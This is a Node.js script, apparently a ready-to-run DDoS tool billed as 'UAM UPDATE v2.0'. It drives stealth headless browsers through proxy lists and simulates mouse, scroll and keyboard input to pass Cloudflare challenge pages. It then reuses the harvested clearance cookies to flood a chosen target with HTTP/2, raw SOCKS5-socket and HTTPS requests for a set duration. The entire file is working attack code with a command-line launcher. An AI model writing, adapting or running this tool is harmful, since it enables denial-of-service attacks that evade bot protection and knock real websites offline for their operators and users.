const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const AnonymizeUAPlugin = require("puppeteer-extra-plugin-anonymize-ua");
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
const socks = require('socks');
const tls = require('tls');
const net = require('net');
const { URL } = require('url');
const http2 = require('http2');
const https = require('https');
const http = require('http');

// Enhanced configuration with attack parameters
const CONFIG = {
    maxThreads: 1,
    requestBatchSize: 10,
    challengeRetryDelay: 6000,
    mouseMovementPatterns: 5,
    connectionTimeout: 10000,
    floodRates: 90
};

class AdvancedAttackSystem {
    constructor(targetUrl, duration, threadCount, proxyList) {
        this.target = new URL(targetUrl);
        this.duration = duration * 1000;
        this.threadCount = threadCount;
        this.proxies = proxyList;
        this.activeThreads = new Map();
        this.capturedCookies = new Map();
        this.userAgents = this.generateEnhancedUserAgents();
        
        this.initializePuppeteerPlugins();
    }

    initializePuppeteerPlugins() {
        puppeteer.use(StealthPlugin());
        puppeteer.use(AnonymizeUAPlugin());
        puppeteer.use(AdblockerPlugin({
            blockTrackers: true,
            removeHeader: true
        }));
    }

    generateEnhancedUserAgents() {
        return [
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/602.1',
            
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0'
        ];
    }

    async initializeAttackCluster() {
        console.log(`[INIT] Starting ${this.threadCount} attack threads`);
        
        const bypassPromises = [];
        for (let i = 0; i < this.threadCount; i++) {
            const proxy = this.getRandomProxy();
            bypassPromises.push(this.bypassCloudflareWorker(i, proxy));
        }

        await Promise.all(bypassPromises);
        await this.coordinateFloodAttack();
    }

    async bypassCloudflareWorker(threadId, proxy) {
        try {
            const browser = await this.createStealthBrowser(proxy);
            const page = await browser.newPage();
            
            await this.configurePageEvasion(page);
            
            await page.goto(this.target.href, { 
                waitUntil: 'networkidle2', 
                timeout: 30000 
            });

            // Monitor for Cloudflare challenges
            const challengeBypassed = await this.handleChallengeDetection(page, browser);
            
            if (challengeBypassed) {
                const attackData = await this.extractAttackParameters(page);
                this.capturedCookies.set(threadId, attackData);
                console.log(`[SUCCESS] Thread ${threadId} bypassed protection`);
            }
            
            await browser.close();
        } catch (error) {
            console.error(`[ERROR] Thread ${threadId} failed:`, error.message);
        }
    }

    async createStealthBrowser(proxy) {
        const args = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-blink-features=AutomationControlled',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-web-security',
            '--disable-features=VizDisplayCompositor',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-renderer-backgrounding',
            `--proxy-server=${proxy}`
        ];

        return await puppeteer.launch({
            headless: 'new',
            args,
            ignoreHTTPSErrors: true
        });
    }

    async configurePageEvasion(page) {
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });
        });

        await page.evaluateOnNewDocument(() => {
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    originalQuery(parameters)
            );
        });

        // Set viewport randomization
        await page.setViewport({
            width: 1920 + Math.floor(Math.random() * 100),
            height: 1080 + Math.floor(Math.random() * 100),
            deviceScaleFactor: 1,
            hasTouch: false,
            isLandscape: true
        });
    }

    async handleChallengeDetection(page, browser) {
        let retries = 0;
        const maxRetries = 3;

        while (retries < maxRetries) {
            const title = await page.title();
            const content = await page.content();

            if (content.includes('challenge-platform') || 
                title.includes('Just a moment') ||
                title.includes('Attention Required')) {
                
                console.log('[DETECTED] Cloudflare challenge present');
                await this.executeBypassRoutine(page);
                retries++;
                await this.delay(5000);
            } else {
                return true; // Bypass successful
            }
        }
        return false; // Max retries exceeded
    }

    async executeBypassRoutine(page) {
        // Complex mouse movement patterns
        await this.generateHumanMouseMovements(page);
        
        // Random scrolling behavior
        await page.evaluate(() => {
            window.scrollTo({
                top: Math.random() * document.body.scrollHeight,
                behavior: 'smooth'
            });
        });

        // Keyboard interaction simulation
        await page.keyboard.press('Tab');
        await this.delay(1000);
        await page.keyboard.press('Space');
    }

    async generateHumanMouseMovements(page) {
        const viewport = await page.viewport();
        const steps = 10;
        
        for (let i = 0; i < CONFIG.mouseMovementPatterns; i++) {
            const startX = Math.random() * viewport.width;
            const startY = Math.random() * viewport.height;
            const endX = Math.random() * viewport.width;
            const endY = Math.random() * viewport.height;
            
            await page.mouse.move(startX, startY);
            for (let step = 1; step <= steps; step++) {
                const x = startX + (endX - startX) * (step / steps);
                const y = startY + (endY - startY) * (step / steps);
                await page.mouse.move(x, y);
                await this.delay(50);
            }
        }
    }

    async extractAttackParameters(page) {
        const cookies = await page.cookies();
        const userAgent = await page.evaluate(() => navigator.userAgent);
        const headers = await page.evaluate(() => {
            return {
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'accept-language': navigator.language,
                'accept-encoding': 'gzip, deflate, br',
                'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'upgrade-insecure-requests': '1'
            };
        });

        return {
            cookies: cookies.map(c => `${c.name}=${c.value}`).join('; '),
            userAgent,
            headers
        };
    }

    async coordinateFloodAttack() {
        console.log('[COORDINATION] Starting synchronized flood attack');
        
        const floodPromises = [];
        this.capturedCookies.forEach((attackData, threadId) => {
            floodPromises.push(this.executeNetworkFlood(threadId, attackData));
        });

        await Promise.all(floodPromises);
        
        // Continue attack for specified duration
        await this.delay(this.duration);
        console.log('[COMPLETE] Attack duration completed');
    }

    async executeNetworkFlood(threadId, attackData) {
        const endTime = Date.now() + this.duration;
        
        while (Date.now() < endTime) {
            try {
                // HTTP/2 Attack Vector
                await this.executeHTTP2Flood(attackData);
                
                // Raw Socket Attack Vector  
                await this.executeRawSocketFlood(attackData);
                
                // HTTPS Attack Vector
                await this.executeHTTPSFlood(attackData);
                
            } catch (error) {
                console.error(`[FLOOD-ERROR] Thread ${threadId}:`, error.message);
            }
        }
    }

    async executeHTTP2Flood(attackData) {
        const client = http2.connect(this.target.origin, {
            settings: {
                enablePush: false,
                initialWindowSize: 65535,
                maxFrameSize: 16384
            }
        });

        client.on('error', () => client.destroy());

        for (let i = 0; i < CONFIG.requestBatchSize; i++) {
            const req = client.request({
                ':method': 'GET',
                ':path': this.target.pathname + this.target.search,
                ':authority': this.target.hostname,
                ':scheme': 'https',
                'accept': attackData.headers.accept,
                'accept-encoding': attackData.headers['accept-encoding'],
                'user-agent': attackData.userAgent,
                'cookie': attackData.cookies,
                'cache-control': 'no-cache'
            });

            req.on('response', () => req.close());
            req.end();
        }

        setTimeout(() => client.destroy(), 5000);
    }

    async executeRawSocketFlood(attackData) {
        const proxy = this.getRandomProxy();
        const [proxyHost, proxyPort] = proxy.split(':');
        
        const socket = await new Promise((resolve, reject) => {
            socks.createConnection({
                proxy: {
                    host: proxyHost,
                    port: parseInt(proxyPort),
                    type: 5
                },
                target: {
                    host: this.target.hostname,
                    port: this.target.port || (this.target.protocol === 'https:' ? 443 : 80)
                },
                command: 'connect'
            }, (err, socket) => {
                if (err) reject(err);
                else resolve(socket);
            });
        });

        if (this.target.protocol === 'https:') {
            const tlsSocket = tls.connect({
                socket: socket,
                servername: this.target.hostname,
                rejectUnauthorized: false
            });

            tlsSocket.on('secureConnect', () => {
                this.sendRawHTTPRequests(tlsSocket, attackData);
            });
        } else {
            this.sendRawHTTPRequests(socket, attackData);
        }
    }

    sendRawHTTPRequests(socket, attackData) {
        const rawRequest = 
            `GET ${this.target.pathname}${this.target.search} HTTP/1.1\r\n` +
            `Host: ${this.target.hostname}\r\n` +
            `User-Agent: ${attackData.userAgent}\r\n` +
            `Accept: ${attackData.headers.accept}\r\n` +
            `Accept-Language: ${attackData.headers['accept-language']}\r\n` +
            `Accept-Encoding: ${attackData.headers['accept-encoding']}\r\n` +
            `Cookie: ${attackData.cookies}\r\n` +
            `Cache-Control: no-cache\r\n` +
            `Pragma: no-cache\r\n` +
            `Connection: keep-alive\r\n\r\n`;

        for (let i = 0; i < CONFIG.requestBatchSize; i++) {
            socket.write(rawRequest);
        }

        setTimeout(() => socket.destroy(), 3000);
    }

    async executeHTTPSFlood(attackData) {
        const agent = new https.Agent({
            keepAlive: true,
            maxSockets: 50,
            rejectUnauthorized: false
        });

        const requests = [];
        for (let i = 0; i < CONFIG.requestBatchSize; i++) {
            requests.push(new Promise((resolve) => {
                const req = https.request({
                    hostname: this.target.hostname,
                    port: 443,
                    path: this.target.pathname + this.target.search,
                    method: 'GET',
                    headers: {
                        'User-Agent': attackData.userAgent,
                        'Accept': attackData.headers.accept,
                        'Cookie': attackData.cookies,
                        'Cache-Control': 'no-cache'
                    },
                    agent: agent
                }, (res) => {
                    res.on('data', () => {});
                    res.on('end', resolve);
                });

                req.on('error', () => {});
                req.end();
            }));
        }

        await Promise.all(requests);
        agent.destroy();
    }

    getRandomProxy() {
        return this.proxies[Math.floor(Math.random() * this.proxies.length)];
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

class AttackOrchestrator {
    static parseArguments() {
        const args = process.argv.slice(2);
        if (args.length < 4) {
            console.error(`
Usage: node kontol.js <target> <duration> <threads> <proxies-file>

Example: node kontol.js https://example.com 60 50 proxies.txt
            `);
            process.exit(1);
        }

        return {
            target: args[0],
            duration: parseInt(args[1]),
            threads: parseInt(args[2]),
            proxyFile: args[3]
        };
    }

    static loadProxies(filePath) {
        try {
            const fs = require('fs');
            return fs.readFileSync(filePath, 'utf8')
                .split('\n')
                .filter(line => line.trim().length > 0);
        } catch (error) {
            console.error('[ERROR] Failed to load proxies:', error.message);
            process.exit(1);
        }
    }

    static async launch() {
        console.log(`
╔═╗╔╦╗╔═╗╦═╗╔╦╗  ╔═╗╔╦╗╔═╗╔═╗╦═╗╔═╗╔╦╗
╠═╣ ║ ╠═╣╠╦╝ ║   ╠═╣ ║ ╠═╣║ ║╠╦╝╠═╣ ║ 
╩ ╩ ╩ ╩ ╩╩╚═ ╩   ╩ ╩ ╩ ╩ ╩╚═╝╩╚═╩ ╩ ╩ 
       UAM UPDATE v2.0
        `);

        const { target, duration, threads, proxyFile } = this.parseArguments();
        const proxies = this.loadProxies(proxyFile);

        console.log(` Target: ${target}`);
        console.log(` Duration: ${duration}s`);
        console.log(` Threads: ${threads}`);
        console.log(` Proxies: ${proxies.length}`);

        const attackSystem = new AdvancedAttackSystem(target, duration, threads, proxies);
        await attackSystem.initializeAttackCluster();
    }
}

// Execute the attack system
if (require.main === module) {
    AttackOrchestrator.launch().catch(console.error);
}

module.exports = AdvancedAttackSystem;